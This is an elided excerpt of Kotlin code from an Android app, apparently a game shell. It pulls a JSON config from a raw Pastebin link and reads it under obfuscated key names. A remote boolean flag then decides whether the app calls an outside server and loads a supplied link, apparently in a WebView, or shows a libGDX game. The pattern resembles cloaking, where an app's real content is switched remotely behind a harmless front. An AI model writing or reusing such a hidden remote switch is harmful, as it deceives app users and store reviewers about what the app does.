...
import pro.ultimate.saver.util.webView.WebViewFragment
...
import pro.ultimate.saver.databinding.ActivityMainBinding
import pro.ultimate.saver.util.AppsflyerUtil
import pro.ultimate.saver.util.DataStoreManager
import pro.ultimate.saver.util.Lottie
import pro.ultimate.saver.util.Once
import pro.ultimate.saver.util.internetConnection
import pro.ultimate.saver.util.log
import pro.ultimate.saver.util.setVisible
...
//            checkDataStore()
    ...
    private suspend fun getFlag() {
        val request: Request = Request.Builder().url("https://pastebin.com/raw/LnLYf5Af").build()
        ...
        try {
            okHttpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    ...
                    val flag      = json.getBoolean("izabella")
                    val key       = json.getString("mariarte")
                    val privacy   = json.getString("bogrenka")
                    val linkCheck = json.getString("fashinso")
                    val link      = json.getString("bridgetr")
                    ...
                    if (flag) getResponseFromServer(linkCheck, key, link)
                        ...
                        withContext(Dispatchers.Main) {
                            val btns = listOf(binding.bibra , binding.bobra)
                            btns.onEach { it.setVisible(View.VISIBLE) }

                            binding.bibra.setOnClickListener {
                                exit()
                            }
                            binding.bobra.setOnClickListener {
                                btns.onEach { it.setVisible(View.GONE) }
                                poloraDo.tryEmit(R.id.libGDXFragment)
                                lottie.showLoader()

                                coroutine.launch(Dispatchers.IO) {
                                    DataStoreManager.Klan.update { "pizda" }
                                }
                            }
                        }
                    }
        ...
        coroutine.launch(Dispatchers.IO) {
            ...
            completerFlow.collect { if (++counter == 1) {
                ...
                withContext(Dispatchers.IO) {
                    DataStoreManager.Klan.update { "rot" }
